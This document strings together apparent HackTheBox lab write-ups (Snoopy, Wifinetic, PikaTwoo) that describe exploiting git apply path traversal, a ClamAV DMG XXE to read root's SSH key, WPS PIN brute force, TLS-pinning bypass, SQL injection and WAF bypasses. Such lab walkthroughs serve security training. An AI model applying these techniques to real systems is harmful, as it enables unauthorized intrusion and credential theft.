The automation script responsible for running the uploaded theme files uses a neat technology, the FileSystemWatcher (docs). It creates the object and assigns to it a Path, a Filter, and some configuration options like IncludeSubdirectories and EnabledRaisingEvents:
$directory is defined at the top of the script to be "C:\inetpub\aero\uploads".
Then it registers this FileSystemWatcher with Register-ObjectEvent, passing it $theme_watchdog along with an action:
It does the same thing creating another watchdog, this time with a filter of *.themepack, with the same -Action value.
$action is defined above as a codeblock as follows:
It gets the full path to the file that triggered the action, and then calls New-FileCreated on that path. New-FileCreated is defined earlier in the file:
It checks if SystemSettings is running, and kills it if so. Then it starts the process of the path, effectively double clicking on the theme. After a 15 seconds sleep, it removes the theme file.
The full source for the script is here:

CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 06 May 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  httpCategory: Recon
nmap finds three open TCP ports, SSH (22), DNS (53), and HTTP (80):
Based on the OpenSSH and Bind versions, the host is likely running Ubuntu 22.04 jammy.
The site is for a security firm:
The footer does have an email address:
There are some other usernames with emails as well on the “About” page:
I’ll note all these down.
The front page has links to /download and /download?file=announcement.pdf.
Both download a zip archive, press_release.zip, but they are different sizes:
The first one has a PDF. The one without a file parameter contains the announcement PDF, plus an .mp4 video:
The last bit of the video has the product manager’s email again:
The “Contact” page has a form to submit questions:
The banner at the top says:
Attention:  As we migrate DNS records to our new domain  please be advised that our mailserver ‘mail.snoopy.htb’ is currently  offline.
Submitting the form sends a POST with the data, but the response is just an error:
It shows on the page as well:
The page URLs show pages ending in .html. There is a reference to PHP in the email error, and that POST does go to /forms/contact.php. It seems the site is likely built on PHP.
The response headers don’t confirm this:
Going to a 404 url returns the standard nginx 404 page:
I’ll run feroxbuster against the site, and include -x html,php since I’ve seen .html pages, and because the mail failure referenced PHP:
I’m running with --no-recursion and --dont-extract-links here, as both of these generate a ton of errors that aren’t useful. Nothing too interesting here. I’ll note that /download and /download.php seem to be the same.
I’ll fuzz the webserver with ffuf to look for other virtual host subdomains that return something different from the standard snoopy.htb page:
I’m using -mc all to show all status codes and -ac to allow for smart filtering of the common response. It finds one more, mm.
I’ll add this to my /etc/hosts file:
Visiting mm.snoopy.htb returns a Mattermost page:
Selecting “View in Browser” leads to a login page:
Clicking “Don’t have an account?” just returns a page saying to contact the workspace admin.
The “Forgot your password?” link provides a form:
It’s always a good idea to compare a login failure of an account that doesn’t exist with one that I think does. If I enter 0xdf@snoopy.htb, it sends this message:
However, if I enter one of the employees from the site, it gives a different error:
This seems likely an issue with DNS to the mailserver, as mentioned in the error on the main page. Presumably the same message would have come back if the mail server had been up, but when that fails, it gets this message instead. I could use this to brute force usernames, but I won’t need to.
With DNS listening on TCP, I’ll try a zone transfer on the snoppy.htb domain. It works!
The various 172.18.0.0/8 IPs suggest perhaps these are containers.
I’m going to hold off on putting these into my hosts file for now. mm I know returns something different, so that one is worthwhile. I can also see that mail.snoopy.htb is not there, which fits with the errors observed above. I’ll keep the others in mind as well.

Category: Shell as cbrown
With those creds, I can SSH into Snoopy as cbrown:

Category: Shell as sbrown
cbrown’s home directory is empty:
There’s one other home directory, sbrown, and cbrown can’t access it:
cbrown can run git apply -v on a single argument as sbrown:
The regex doesn’t allow spaces or the characters needed to simulate a space in Bash, so it has to be one repo arguemnet to apply.
A Git repo always has a folder named .git at the root of the project. Weirdly, there are no repos on this box that cbrown can see:
git is installed on Snoopy, and it’s version is 2.34.1:
Searching for “git apply exploit” leads to a blog post from GitHub, and several posts on a path traversal vulnerability, CVE-2023-23946:
This page shows the versions that are vulnerable to CVE-2023-23946:
2.34.1 should be vulnerable.
The GitHub post has a nice summary of the vulnerability:
Git allows for applying arbitrary patches to your repository’s history with git apply. In order to prevent malicious patches from creating files outside of the working copy, git apply rejects patches which attempt to write a file beyond a symbolic link.
However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victim’s filesystem when applying malicious patches from untrusted sources.
Like it says, git apply is about applying “patches” to a repo. Patches are files that show changes between two versions, and look like the output of a git diff:
The vulnerability here is that if the symbolic link is created by the diff, it can still edit outside the repo, giving arbitrary write.
I recently showed how git could add a file that isn’t in the repo in Encoding. This would skip the need for the link. Unfortunately for me, Git tries to block applying a patch outside of the repository itself. There are ways around this (I’ll show one in Beyond Root), but with the regex-limited sudo, I don’t know a way.
At the time of release of Snoopy, there aren’t any public POCs for CVE-2023-23946. I’ll have to figure out how to exploit this.
The source code for Git is on GitHub. The Nist and Mitre pages for the CVE have links to this commit. apply.c has the fix, which is 24 lines of comment and two lines of error check:
Further down, there’s a change to t/t4115-apply-symlink.sh (link). In this file, it adds tests that should now fail!
There’s tests for creating, modifying, and deleting files. This is basically a POC.
Before I start working with git, I’ll need to set some global variables to keep git from yelling at me:
Now I’ll create a directory in /dev/shm and make it a Git repo:
To test, I’m going to try to create a file in a directory I own (without using sudo) to make troubleshooting easier. I’ll create /home/cbrown/0xdf. First I need to create a symlink that points to target directory and add it to the repo:
I’ll create the patch file, using the data from the test, modifying it slightly:
The only change is from create-me to 0xdf in two places. git apply patch will run it, and the new file exists:
With sudo, I can do this exploit as sbrown. The first thing I’ll try is overwriting their authorized_keys file. I’ll start a brand new repo, this time adding a symlink pointing to sbrown’s .ssh folder:
I’ll create a patch file again, this time changing 0xdf to authorized_keys, and busted to an SSH public key:
When I run this, it fails:
The  warning is important to notice here. It’s trying to “unlink” symlink and failing. That’s because sbrown doesn’t have permissions to. The directory is owned by cbrown, and all users can’t write to it:
If I change the permissions on the dir such that all users can write, it works without error:
With my key in place, I can SSH into the box as sbrown:
And get user.txt:

Category: Shell as root
sbrown can run clamscan in a specific way as root using sudo:
This is actually one of the first time I’ve seen regex used in a sudo rule like this, which was added in version 1.9.10 in March 2022.
Searching for “clamav vulnerability” will turn up many articles from February 2023 about CVE-2023-20032 and CVE-2023-20052:
CVE-2023-20032 is an issue with how HFS+ partition files are handled by the scanner:
This vulnerability is due to a missing buffer size check that may result in a heap buffer overflow write. An attacker could exploit this vulnerability by submitting a crafted HFS+ partition file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to execute arbitrary code with the privileges of the ClamAV scanning process, or else crash the process, resulting in a denial of service (DoS) condition.
I’m not able to find any POCs for this, and exploiting it seems very difficult to craft, probably too hard for even a hard box on HackTheBox.
CVE-2023-20052 is an XXE attack in how clamav parses DMG files.
ClamAV on Snoopy is 1.0.0, so these vulnerabilities should apply:
Writing this only a few days after Snoopy’s release, there’s almost no technical details about the CVE. I’m going to take the strategy of:
[add part here about showing easy way at the end or in BR]
A DMG is a proprietary disk image format used primarily on macOS. It is a type of file that acts as a container for other files and folders, and is commonly used for distributing software, applications, and other files. It’s similar to an ISO file.
I’ll read about how to create a DMG file, but on Linux it’s not trivial (at least during the initial release week). Instead, I’ll opt to find a DMG file on the internet.
Some googling finds this one, a notepad application. I’ll download it.
The XML in a .dmg is the Apple plist file, a file format used by Apple’s macOS and iOS operating systems to store configuration and preference data. Running strings on the file finds the XML:
The full XML looks like:
That’s very long. I’ll note two key values, blkx and plist, each having an <array> with a <dict> inside..
I’ll upload this file into the scanfiles directory:
I’ll scan it using the syntax allowed by sudo. This generates a ton of output. I’ll search around in it, looking for the “dmg” parser, and find this:
These stand out because they are from the cli_scandmg module. The first one says “Matched blkx”, which was one of the two fields I noted in the XML. The last one says “wanted lbkx, text value is plst”. It’s not immediately clear to me what this means, but I am getting the value of a key!
I’ll copy the file to notepadxxe.dmg, and open it in a hexeditor (like ghex). This XML starts like:
An XXE POC for file disclosure looks like this:
I’ll edit the DOCTYPE in the DMG to create an entity that references /root/.ssh/id_rsa:
I’ve used spaces to pad out the extra stuff. I am using a variable df such that when I reference it later as &df;, it takes four characters, the same length as plst. Down the file a bit, I’ll find the plst key and modify it:
I’ll upload this file again, and run it just like before. Where before it said “text value is plst”, now it has the private key:
Not long after the release of Snoopy, nokn0wthing put out this repo. It has a Docker container that will generate the DMG file for me.
Following the instructions in the repo, I’ll clone it and build the container:
I’ll drop into the container, mounting the current directory in as the /exploit directory:
The first step is to generate an ISO image. There’s one in /exploit, but I’ll delete it for the sake of demo:
Next I’ll turn that into a DMG:
Finally, I’ll use bbe (the binary block editor) to edit in the XXE, modifying the command from GitHub to read root’s ssh key instead of /etc/passwd:
I’ll exit the container and (because I was working out of the mapped directory), exploit.dmg is there. I’ll scp it to Snoopy:
And scan it as root:
With root’s private key, I can SSH into the box:
And grab root.txt:
Snoopy was patched once it came out of scoring points for the season:
On release, cbrown’s sudo looked like:
and sbrown’s sudo looked like:
Each of these allowed for an unintended solution, and each was tighted up with regex to block the unintended paths.
The main point of the exploit to showcase is that symbolic links created in the diff are not protected. However, it is possible to not even need that if I can give any parameters to git apply as was the case on release.
For example, I’ll create a diff file in /dev/shm:
Now I can use --unsafe-paths and --directory to apply this diff itno the .ssh folder of sbrown:
And SSH in as sbrown:
Looking through the -h options for clamscan, -f jumps out as interesting.
With --file-list or -f, it will get a list of files to scan from a file. Whenever you have something that can read a filename from a file and interact with it, it’s worth trying it on root.txt.
Here, it reads the hash out of root.txt, and then tried to read the file with named by that hash. But that hash isn’t a file, so it fails, and in the error message, prints the flag!
The same trick works to read /root/.ssh/id_rsa:
Some bash foo will print that nicely by getting just the first of the two error lines and isolating just the content:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 Sep 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domainCategory: Recon
nmap finds three open TCP ports, FTP (21), SSH (22) and DNS (53):
There is anonymous FTP access I’ll definitely want to check out further. Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
UDP scanning is slow and unreliable. Still, it looks like DNS (53) and perhaps DHCP (67) might be open:
To get a clearer picture of what’s on the FTP server I’ll connect using the name “anonymous” and it doesn’t ask for a password:
There’s five files in the share:
I’ll grab all five by turning off the prompt and using mget:
A quick triage of the files gives:
Digging deeper into the backup, it’s an etc folder:
Most of these don’t have much of interesting. passwd does provide a list of usernames:
The config directory has a handful of files:
The only one with anything useful is wireless:
It’s defining two devices, each with an interface on it. There’s a pre-shared key (PSK, or password) for a WiFi network.
Given the use of wifinetic.htb in the documents, I’ll add that to my /etc/hosts file:
Given that DNS is listening on TCP, I’ll try a zone transfer to see if there are any subdomains:
I’m not sure why it times out at first, but it eventually succeeds and finds just the main domain.

Category: Shell as netadmin
With the password from the Wifi config, I’ll use crackmapexec to try each user from the passwd file with the password from the wireless config over SSH. I like to use --continue-on-success in case there are more than one user that shares that password. It finds one:
I’m able to connect with that username / password:
And read the user flag:

Category: Shell as root
The netadmin user’s home directory is basically empty:
There are a bunch of other users with home directories in /home:
They are all the same, with some standard files as well as a .ssh directory that netadmin can’t access.
/opt has a share directory that seems to match what’s available over FTP:
The vsftpd.conf file in /etc/ confirms this (using grep to remove lines that start with a comment marker #):
I’ll always check for interesting SetUID and SetGID binaries. Enumeration tools like [LinPEAS])() will identify these as well:
These all seem standard. I’ll also look for binaries with capabilities:
The last one jumps out! Reaver is a WPS cracking tool!
Looking at the network interfaces, there are six!
eth0 is the standard LAN interface that has the 10.10.11.247 IP that I’ve been attacking. lo is the standard localhost interface with 127.0.0.1.
mon interfaces (like mon0) are typically used for a monitor mode interfaces. This is used for sniffing and monitoring traffic on a WiFi network. wlan interfaces (like the other three) are used for interfacing with wireless networks.
Wireless settings are typically stored in /etc/wpa_supplicant.conf, which is present, but netadmin can’t read it:
iw dev will give more information about the wireless interfaces:
This gives a bunch of information about each physical network interface as well as the interfaces on them.
wlan0 is on phy0. It’s running as an access point (type AP) with SSID of OpenWrt on channel 1.
wlan1 is on phy1, and is running in “managed” mode, which suggests it’s a client. Given that the SSID, channel, and center frequency are the same as wlan0, this is a client on that access point.
wlan2 and mon0 are on phy2. wlan2 is also acting as a client (in “managed” mode), where as mon0 is in monitor mode as suspected. wlan2 doesn’t show any connection.
WiFi Protected Setup (WPS) is a standard designed to make joining a WiFi router easier, especially in home settings. The device would have an 8 digit pin printed on the device, and the user could enter that pin to join the network.
There is an issue with the implementation making it trivial to brute-force the 8-digit pin. In theory, this was meant to offer one hundred million possible pins. Practically speaking, the WPS system will tell you if the first four digits are correct, and then if the next three digits are correct. It also uses the last digit as a checksum. This means to effectively brute force this, an attacker only needs to try 10,000 possibilities for the first four, 1,000 for the next four, or at most 11,000 pins (much less than one hundred million!).
Reaver is a tool used to recover the network WPA PSK (password) by brute forcing the WPS pin.
Running reaver shows two required arguments:
I need the name of the name of the monitor-mode interface and the BSSID of the target AP. The example at the bottom, reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv shows the BSSID looks like a MAC address, and in fact, it is.
The target AP is wlan0, which has a MAC from the iw command above of 02:00:00:00:00:00. The monitor-mode interface is mon0. Most reaver tutorials show using the wash command to get the BSSID/MAC. This doesn’t work here, and I’ll look at that in Beyond Root.
I’ll use those to run reaver:
Very quickly it is able to crack the WPA password (or pre-shared key (PSK)) for the wireless network.
This password works as the password for root on the box, either with su in an existing session:
Or starting a new SSH session:
Either way, I can grab root.txt:
Most tutorials showing how to run reaver will use something like wash -i mon0 to get the BSSIDs of the available networks and enumerate is the WPS is locked (which makes the brute force much less likely to work).
wash is a tool that comes as part of reaver, and is meant to enumerate networks. But it requires the CAP_NET_RAW capability, just like reaver does.
It is unusual to be performing this attack without root on the attacking box. Typically, this attack is done from attacker controller hardware in local proximity to the WiFi network. But even if someone is doing it from a compromised box, they will need root, as it is very unlikely to find reaver sitting around with the necessary capabilities in the real world as is the case here for HTB.
With a non-root shell on the box, if I try to run wash -i mon0 as recommended, and it just hangs:
The source code for wash is here, starting with the wash_main function. I’m no expert at C, but it seems like it is is doing active work on the network.
There’s a function called send_probe_request here that sends a packet. There’s also a loop over next_packet. Based on this, it makes perfect sense that wash would need some kind of capability or root privilege in order to work.  In fact, I get errors when I try to run wash on some other interface:
At this point, it seems like it’s clearly a permissions issue. So it’s surprising when running as root gives the same result:
Interestingly, it now hangs instead of failing on wlan0 and wlan1:
More interestingly, it works on wlan2:
Even more interestingly, when I ran this on wlan2, I had wash -i mon0 running in another terminal, and it printed as result at the same time:
My current theory to explain all of this is:
That’s what I’ve got at the moment! Please reach out on Twitter (0xdf_) or Discord (0xdf) if you have a better understanding!
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 04 Feb 2023
OS : Linux
Base Points : Insane [50]
Creators : polarbearerpwnmeow
Nmap scan:
Host is up (0.093s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
4369/tcp  open  epmd
5000/tcp  open  upnp
5672/tcp  open  amqp
8080/tcp  open  http-proxy
25672/tcp open  unknown
35357/tcp open  openstack-idCategory: Recon
nmap finds nine open TCP ports:
Based on the OpenSSH version, the host is likely running Debian 11 bullseye.
these scan results show:
I’ll note the TLS certificate name on TCP 443 is api.pokatmon-app.htb. I’ll add this to my /etc/hosts file. I’ll look for any kind of virtual host routing and additional subdomains for each HTTP server, but it doesn’t seem to change anything.
The site is the “Pokadex” site from Pikaboo:
Interestingly, while on Pikaboo, clicking on one of the monsters gave a message about the API integration coming soon, this time it leads to a 404 response:
That is a JSON response that Firefox is displaying in a pretty manner:
The link to “Docs” goes to /docs which returns a redirect to /docs/ which redirects to /login:
The HTTP headers show nginx sitting in front of the Express NodeJS framework:
That 404 response is the default response for NodeJS, which fits Express:
I’ll run feroxbuster against the site:
There’s not much new here except for /CHANGELOG. It shows some hints about what is to come:
I’ll keep an eye out for an Android app and an authentication API, as well as the Modsecurity web application firewall (WAF).
This page just returns a 404 message at the root:
The HTTP response header have a different Server header here:
APISIX is an API Gateway that can help with things like load balancing. Searching for the 404 string also finds APISIX-related results:
I’ll also note the version of APISIX, 2.10.1. There are several vulnerabilities in this version, which I’ll come back to later.
feroxbuster shows that anything with the string “private” in it returns 403:
At first I thought that was nginx or modsecurity, but looking at the raw response shows something different:
That message is associated with the uri-blocker plugin for APISIX:
This page also returns a 404 message, though a different one:
The HTTP response headers show the nginx server, but also include X-Trans-Id and X-Openstack-Request-Id headers:
OpenStack is open-source cloud software that simulates things like AWS. According to the OpenStack default ports documentation, 8080 typically hosts the OpenStack Object Storage service, swift.
The documentation for swift shows a few endpoints to check. /info does return information that shows this is swift version 2.27.0:
The next API to look at is /v1/{account} and then /v1/{account}/{container}. Unfortunately, I don’t know any accounts a this time. Looking at both /v1/admin (which may or may not exist) and /v1/0xdf (that I don’t expect to exist), they both return the same 401 Unauthorized response. Running  ffuf to try other names doesn’t find anything.
The rest of the endpoints require an account name. I do note that the docs show using a X-Auth-Token: {token} header to access these endpoints. I don’t have a token at this time.
Visiting either port 5000 or 35357 returns the same JSON:
Searching for the string “openstack.identity-v3+json” returns results for the keystone identity service:
The same OpenStack ports list shows that port 5000 is the default for keystone.
In looking for information about keystone and potential vulnerabilities, I’ll find CVE-2021-38155, which is easy to miss as it’s listed as both an information disclosure vulnerability and a denial of service vulnerability. By guessing an account name and failing auth until it locks out, keystone will respond differently if the account exists or not. This bug post on launchpad shows how this could work.
This feature, lockout_faulure_attempts, according to the docs, is disabled by default. I don’t really have a way to figure out what the number of attempts required or if this is even enabled other other than to try.
I’ll start with a POST request to /v3/auth/tokens, copying the body from the link above, and looking at what happens with a username I expect not to exist. I’ll use a bash loop to send the request ten times:
It just returns the same thing over and over.
I’m going to start with a guess that an admin account might exist. If this doesn’t work, I won’t know if that’s because it’s not configured to do lockout, or if it’s because admin user doesn’t exist. But if it does work, I’ll have proved admin is an account and that this technique works. It works:
At requests 6 and 7 it shows a different message, saying that the account is locked with a userid.
I don’t really need this exploit to guess there’s an admin user. I want to look for other users. The most efficient way I know to do this is with ffuf, giving it two wordlists (as described here). The first list will be just the numbers 1-10. This is just to make sure it does each name 10 times. The second list is the list of names to fuzz. I’ll pass both lists, with the numbers as F1 and the names as F2. I’ll use F2 in the name field, and I’ll include F1 in the wrong password just so that it’s used.
It finds another name after about four minutes, andrew:
Each username shows up a few times because somethings the locked message comes more than once. I’ll leave the fuzz going in the background (it’ll take over an hour and a half), but it won’t find any others.
The docs for swift show different ways to configure authentication, and one of the methods is keystone. With this setup, an end user can use a prefix (by default AUTH_) to their account name to get authentication in the background.
Trying manually for both admin and andrew doesn’t look promising:
Still, I’ll look for containers with ffuf, starting with andrew (as it was more difficult to find and not just guess):
After a couple minutes, it finds android. It runs for a long time after that, but android is all that is needed.
I’ll hit that endpoint, and it returns the name of a file:
I’ll download it with wget:
I’ll unpack the files in the APK using apktool. I could use 7z or unzip, but apktool will also convert some binary files to more readable formats:
In the root of the unpacked application, AndroidManifest.xml describes how the app is configured and organized.
A few things jump out:
The assets/flutter_assets directory also suggests this application is made with Flutter, a framework for building mobile applications.
This post talks about reversing applications that are made with Flutter. I can check for a debug mode application at assets/flutter_assets/kernel_blob.bin, but there’s nothing there. For a release mode application, I’ll find libflutter.so in lib/[arch]/, and that’s the case here:
libapp.so is the compiled application. In theory, I can import this into Ghidra and take a look, or work with some of the tools in that post, but I’m going to start with dynamic analysis instead.
Before I move on, I will take a look at the files in the application. I can try taking a look at the smali directory, as that’s typically the most human-readable code. Unfortunately, it’s just an incredibly obfuscated mess. This is the result of the app’s being built with the --obfuscate flutter option.
The flutter_assets directory does has a keys directory:
Inside it there is a public and private RSA key pair:
I’ll use these later.
There are several Android emulators out there. My preferred one is Genymotion, as it’s just the easiest to get a VM created and running (shown previously in RouterSpace and 2019 Flare-On Flarebear). Ippsec has a really nice video showing how to get the Genymotion Android emulator running (inside a VM). I’ll follow similar steps here to get a VM running, install the Pokatmon application, and have network traffic proxied through Burp to look at the traffic coming out of the application.
Because I’m going to run VirtualBox (Genymotion) inside of VirtualBox (my VM), I’ll need to make sure my VM has nested virtualization enabled (and that it’s enabled in my BIOS):
I’ll also make sure it has as many processors and RAM as I can give it, as the Android VM will want 4GB of RAM and 4 processors as a minimum.
I’ll start by getting the prereq packages installed for Genymotion with sudo apt install virtualbox adb. Next, I’ll get the latest installed from the Genymotion download page, set it as executable, and run it:
This launches a brief setup. I’ll have to register an account or login with my account, and select the free for personal use option. Eventually it launches the emulator:
The plus button at the top right will start the process of adding a new virtual device. In the first window, I’ll filter on Pixel to get a clean Android experience, and select the newest one, the Pixel 3XL:
On the next page, I’ll leave everything as is:
Android 12 is almost two years old (released in October 2021), but it is still widely in use in 2023, so it should be good enough for what I need here.
The next page sets the hardware, which I’ll leave as the default:
I’ll let the next three pages be default as well, and when I finish, it starts creating the device:
Once that’s done, it pops up to let me know:
I’ll click start, and it moves to “Booting”. This can take a while - I think it’s just that doing VirtualBox inside VirtualBox like this is slow. Once it’s done, I’ll have a virtual Android device:
adb is the Android debugger, a command line tool to interface with attached Android devices. Genymotion launches in such a way that the device is visible to adb, attached as if plugged in as a USB device:
To install the application on the virtual phone, I’ll use adb install:
Now pulling up from the bottom on the phone, the application is there:
Clicking on it will launch it:
The “Invite Code” field seems to only take digits and upper-case characters. Putting some junk in and clicking “Join Beta” returns:
Genymotion is smart enough to use my /etc/hosts file. If I comment out the domains I set earlier and click again, it shows:
If I watch in Wireshark for this connection (with the IP set in hosts), I’ll see it’s happening over 443 / TLS, so I can’t snoop this way.
If I try to write to most of the filesystem right now, it will fail, as / is mounted read only. For example:
I’ll get a shell on the device and run mount to see that / is mounted “ro” for read only:
I can fix this by remounting the disk. I’ll first run su to get full root, and then mount with the remount option:
Now if I push a file, it works:
Now I want to get the phone to trust the certificates generated by Burp so that connections to my proxy will be trusted. This step isn’t actually required for how I ended up solving this part of PikaTwoo, but I wanted to show the steps I took to help explain my thinking.
With Burp proxy enabled, I’ll fetch the certificate from localhost:8080/cert and convert it to the pem format:
I need to rename it to a specific value based on a hash of the certificate. For this certificate, it will always be 9a5ba575.0, where 9a5ba575 can be determined here:
I’ll enable that on the Android device with adb:
I’ll set my host as the proxy for the device with adb as well (where 10.0.2.5 is the IP of my host):
I’ll make sure that Burp is listening on all interfaces under Proxy > Proxy Settings > Proxy Listeners:
Now opening the WebViewer test browser and visiting a page, the request shows up in Burp:
Unfortunately, traffic from the application still doesn’t show up in Burp.
My best guess as to why this is failing is due to certificate pinning, which is where the application doesn’t just accept any certificate that is valid according to the OS cert store, but rather limits to known good certs to prevent just this kind of attacker in the middle attack.
Frida is a toolset for “dynamic instrumentation” of mobile applications. It is kind of like Tampermonkey for mobile applications. This page has instructions for getting it installed for Android.
I’ll run pipx install frida-tools to get that part installed on my VM.
I also need the Frida server on the emulated Pixel. I’ll need to know the architecture of the Pixel, which I can check with adb shell to see it’s x86_64:
I’ll go to the latest release page, and among the many files, find the frida-server-[version]-android-x86_64.xz file. I’ll unzip the resulting file with 7z x frida-server-16.1.3-android-x86_64.xz, which gives a single executable file.
Following the instructions, I’ll upload it and set it executable:
While the instructions don’t show this, I found in experimenting that I’ll need to run Frida as full root, so I’ll get a shell, su, and run it:
The last command just hangs, but in another windows I can do frida-ls -U to get a file listing of the mobile device (/test.txt is there from earlier):
My goal here is to get the application to make its “Join Beta” request in a manner I can see it. To get the traffic going to, I’m going to update my hosts file so that it thinks my IP is api.pokatmon-app.htb. Then I’ll have Burp listen on 443 forwarding requests to the real PikaTwoo server.
For this to work, I’ll need to get around the TLS certificate pinning. I’ll use Frida to inject a script into the application that patches out that check.
I’ll update my hosts file so that api.pkatmon-app.htb points at my IP, 10.0.2.5.
I’ll need Burp listening on 443. I’ll have to run it as root to get this, and then I’ll add a new listener:
The request will be coming directly to this listening, rather than as a proxy, so I’ll need to tell it where to go. Under “Request handling”, I’ll configure it to go to PikaTwoo:
“Support invisible proxing” is important here, as that’s what tells Burp to decode the TLS connection and start a new one to PikaTwoo.
Finally, I need to inject this script from NVISO. It disables the TLS verification for a Flutter application. Looking at the JavaScript, it has some regex that match on different bytecodes for different OS / architectures:
It looks through memory for these patterns, and then replaces the assembly in such a way to effectively disable the TLS check.
I’ll use the application name I found above, and inject this with frida using -U for USB device, -f [app name] and -l [script]:
Running this kills the app if it’s already running and relaunches it. It reports that it found the target function (ssl_verify_peer_cert) in memory in libflutter.so and patched it.
I’ll enter anything into the fields on the application, and click “Join Beta”. It reports “Invalid code”, which is a good sign it was able to talk to the server:
In Burp there’s a HTTP stream with the POST request and the response:
I’ll send this request over to Repeater to take a look. I’m able to send it again and get the same response:
If I change the code at all, the response changes to “invalid signature”:
There is an authorization header that has a signature in it. If I go back to the app and submit with a “2” on the end of the code (to match what I added in Repeater above), the request has a different signature header and it returns “invalid code”. This suggests that the application is signing each request and that the server is validating that.
I noted above a private.pem RSA key file. That seems like a good candidate for what is signing the requests. I’ll ask ChatGPT how to sign a message with an RSA key and bash, and it suggests openssl:
It’s suggesting signing a hash of the message. I’ll play around with different things, looking at the message, the hash of the message, with and without newlines on the message, etc. I’ll note that the hash is binary, and the header is base64, so I’ll encode the result as well. After some playing, I get this:
This matches the signature header above! Now I can sign my own messages.
With the ability to sign my own requests, I can try different things, just updating the signature header each time. To start, I’ll just up arrow and edit the POST body to get the new signature. If that gets to be tiring, I could write a Python script that takes a body, generates the signature, sends the request, and returns the result.
I’ll try changing the “email” field to just a single quote. If this causes a crash, I can try more SQL injection payloads. I’ll generate a signautre:
On updating the signature (making sure to leave signature= at the front) and body and sending, it returns 500 Server Error, which is definitely promising:
That could be SQL injection. I’ll see if I get back a “valid” message with an injection:
Not only is this valid, but it returns the email and the code! I was expecting to have to brute force these with SQL regex.
I could go on trying to extract more information from the DB, but this is all I need to continue with the box, and it’s a minor pain to do with the signing (though I think it could make a nice tamper script in sqlmap).
With a valid email and code, I can join the beta. It fails trying to load www.pokatmon-app.htb (over HTTP, not HTTPS):
I’ll update my hosts file to include the www subdomain, and it just loads the page I have already accessed on TCP 80:
Searching for APISIX vulnerabilities finds a few that this version should be vulnerable to:
Given that I already identified uri-block blocking anything with “private” above, it makes sense to try to abuse CVE-2021-43557 to get past that. Adding an extra / doesn’t work as the example above:
In fact, anything with “private” anywhere seems to still get blocked:
However, if I URL encode a character, such as “p” -> “%70”, it returns a 404:
This could be just failing to find that route (because I’m looking for something else besides /private), or it could be that I need to find an endpoint in that directory.
To explore if there is a private directory, I’m going to create a custom wordlist where I replace all the instances of “private” with “%70rivate”:
Now when it tries /private, it will encode it and if it is bypassing the filter, then it will work.
I’ll try feroxbuster with that list in the /%70rivate directory:
feroxbuster finds two interesting results:
The /private/login endpoint with a POST request returns details about what is missing and I can build a valid request:
I’ll try with the roger.foster email, and it returns the same thing:
Trying this endpoint manually returns usage as well:
If it gets an unknown email, it says so:
But with the email from the beta registration, it returns a token:
If I try to POST to /private/password-reset, it returns 405 Method Not Allowed. But if I include the email, then it asks for a token and a password:
It reports to have changed the password! Trying the /private/login endpoint now reports success:
I have a username and password, but I need somewhere to use it. It’s not unreasonable to think that the login form on http://www.pokatmon-app.htb might use this API on the backend to validate logins. I’ll try the newly reset creds there, and it works:

Category: Shell as www in pokatdex-api Pod
The page behind the login form is a Swagger page, which provides documentation and buttons to try the API endpoints. The last three “Return Pokatmon data for the [region] region”, for “Chantoo”, “Oohen”, and “Jiotto” regions.
If I execute /chantoo (after adding the new subdomain to /etc/hosts so that it can resolve), it returns JSON data with a list of monster:
The first endpoint, /, takes a region as a GET parameter. Giving it “chantoo” returns the same data as the /chantoo endpoint:
If I try to send something that isn’t a region, it returns an error:
Interestingly, in the error payload there’s a reference to that it’s not in debug mode.
I’m curious to see if I can set debug to true. I’ll move to curl, first with the same command to make sure it works:
Now adding debug=true:
So much information in here! This is a PHP API application. It’s trying to include the region data from a file in a regions directory.
It’s interesting that the same data comes from /chantoo and /?region=chantoo. It could be two different end points, but it seems more likely that they are handled by the same code. This could be managed within PHP, or nginx could do a modification of the URI to get them to the same place.
To play with this, I’ll try enabling debug mode for the /chantoo endpoint:
Nothing changed. What about a non-existent region:
It explicitly says that debug is false. The GET parameter isn’t getting there.
One possibility is that nginx is taking the stuff after / and rewriting that to /?region=[stuff]. If that were the case, then the ? in the request above would actually need to be a &. I’ll try that, and it works:
That’s a pretty weird URI, as typically & comes after ?. But given it works, that implies that something (probably nginx) is adding ? to the URI already.
Cheating a bit ahead to where I get a shell and can look (at /etc/nginx/nginx.conf in the container), the actual configuration for this server looks like:
The location / block is using try_files to look at three different paths for this request:
This should be vulnerable to a local file include (LFI), which will give file read and potentially execution (if I can get a malicious PHP file onto disk where it can be included). Unfortunately, when I try to access ../../../../../../../etc/hosts, it is blocked and returns 403:
In fact, having .. in the parameter anywhere blocks it:
This feels like ModSecurity, a web application firewall that is popular in nginx (though phasing out in favor of another WAF).
The default rule set used by ModSecurity is the OWASP ModSecurity Core Rule Set (CRS). There is a vulnerability in the CRS from June 2021 (CVE-2021-35368) that allows for bypassing the rules by abusing “trailing pathname information”.
This article goes into more detail about the issue. The CRS has this concept of Rule Exclusions (REs) that are written for various CMSs like Drupal, WordPress, etc. These are meant to disable rules that are known to generate false positives when working with that specific technology.
There’s a specific rule, REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf that is meant to only work when enabled, but due to a bug, is enabled whether the owner has turned them on or not. Three of these rules (9001180, 9001182, and 9001184) disable body scanning for certain paths.
The file in question is available here. I’ll look at 9001180 first, since it’s the simplest:
The rule looks to see if the file path is /admin/content/assets/add/[a-z]+$. If it is, it checks if there’s a cookie that matches a regex (I’ll use SESSa for simplicity here) that has a value made up alphanumeric characters plus underscore and dash. If that matches, then it turns off access to the request body for ModSecurity.
